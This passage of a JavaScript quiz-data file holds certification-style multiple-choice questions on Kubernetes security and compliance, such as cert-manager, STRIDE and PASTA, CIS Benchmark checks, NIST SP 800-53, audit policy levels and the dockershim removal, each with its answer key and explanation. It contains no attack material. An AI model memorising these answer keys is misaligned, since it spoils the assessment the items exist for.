    options: [
      'Scanning TLS certificates for vulnerabilities',
      'Automating TLS certificate issuance and renewal',
      'Enforcing mTLS between all pods',
      'Managing etcd encryption keys',
    ],
    correctAnswer: 1,
    explanation: 'cert-manager is a Kubernetes add-on that automates the management and issuance of TLS certificates from various sources including Let\'s Encrypt, Vault, and self-signed CA. It handles certificate requests, renewals, and secret updates. Option A describes a security scanner function. Option C describes a service mesh feature. Option D describes an etcd encryption key management function, which is handled by KMS or manual configuration.',
    difficulty: 'Easy',
    relatedSection: '/domain5/d5-c5',
  },

  // ===== DOMAIN 6: Compliance and Security Frameworks (5 questions, ids 101-105) =====
  {
    id: 101,
    domain: 6,
    domainName: 'Compliance and Security Frameworks',
    question: 'Which of the following is NOT a threat modeling methodology?',
    options: [
      'STRIDE',
      'PASTA',
      'OCTAVE',
      'CIS Kubernetes Benchmark',
    ],
    correctAnswer: 3,
    explanation: 'The CIS Kubernetes Benchmark is a configuration hardening guide, not a threat modeling methodology. STRIDE, PASTA, and OCTAVE are all established threat modeling frameworks used to identify and categorize security threats. STRIDE is from Microsoft, PASTA is process-centric, and OCTAVE is risk-based. Options A, B, and C are all legitimate threat modeling approaches.',
    difficulty: 'Medium',
    relatedSection: '/domain6/d6-c3',
  },
  {
    id: 102,
    domain: 6,
    domainName: 'Compliance and Security Frameworks',
    question: 'Which of the following are checked by the CIS Kubernetes Benchmark? A) API Server anonymous auth disabled B) Kubelet read-only port disabled C) Container image vulnerability scanning D) etcd peer communication uses TLS',
    options: [
      'A, B, and D only',
      'All of the above',
      'A and B only',
      'B and D only',
    ],
    correctAnswer: 0,
    explanation: 'The CIS Kubernetes Benchmark checks control plane settings like disabling anonymous auth (A), Kubelet hardening like disabling the read-only port (B), and etcd security like TLS for peer communication (D). Container image vulnerability scanning (C) is a supply chain security practice that is outside the scope of the CIS Kubernetes Benchmark, though it is important for overall security. Options B, C, and D are either too broad or too narrow.',
    difficulty: 'Medium',
    relatedSection: '/domain6/d6-c4',
  },
  {
    id: 103,
    domain: 6,
    domainName: 'Compliance and Security Frameworks',
    question: 'What is the primary scope of NIST SP 800-53?',
    options: [
      'Container security specifically',
      'Security and privacy controls for federal information systems',
      'Kubernetes threat modeling',
      'Supply chain security for software artifacts',
    ],
    correctAnswer: 1,
    explanation: 'NIST SP 800-53 is the "Security and Privacy Controls for Information Systems and Organizations" — a comprehensive catalog of controls used primarily for federal information systems in the United States. Option A describes NIST SP 800-190. Option C is unrelated to 800-53. Option D describes supply chain frameworks like SLSA or SSDF.',
    difficulty: 'Medium',
    relatedSection: '/domain6/d6-c2',
  },
  {
    id: 104,
    domain: 6,
    domainName: 'Compliance and Security Frameworks',
    question: 'The following audit policy is configured. What is recorded when a user reads a secret?',
    codeSnippet: `apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["secrets"]
  - level: Metadata
    omitStages:
      - RequestReceived`,
    options: [
      'Only the request metadata',
      'The full request and response bodies, including secret data',
      'Only the timestamp and username',
      'Nothing, because secrets are excluded from audit logs',
    ],
    correctAnswer: 1,
    explanation: 'The `RequestResponse` audit level records the complete request body and response body for secret resources. This means the actual secret data (keys, passwords, tokens) will be written to the audit log, which is a significant security consideration. Option A describes the `Metadata` level. Option C describes an even more limited subset. Option D is wrong because secrets are explicitly included in the policy.',
    difficulty: 'Medium',
    relatedSection: '/domain6/d6-c1',
  },
  {
    id: 105,
    domain: 6,
    domainName: 'Compliance and Security Frameworks',
    question: 'Dockershim was completely removed from Kubernetes in which version, requiring all clusters to use a CRI-compatible container runtime?',
    options: [
      '1.23',
      '1.24',
      '1.25',
      '1.27',
    ],
    correctAnswer: 1,
    explanation: 'Dockershim, the shim that allowed Kubernetes to use Docker directly, was removed in Kubernetes 1.24. After 1.24, clusters must use a Container Runtime Interface (CRI) compatible runtime such as containerd or CRI-O. Option A (1.23) was the last version with dockershim. Options C and D are incorrect because the removal happened earlier.',
    difficulty: 'Hard',
    relatedSection: '/domain6/d6-c2',
  },
];
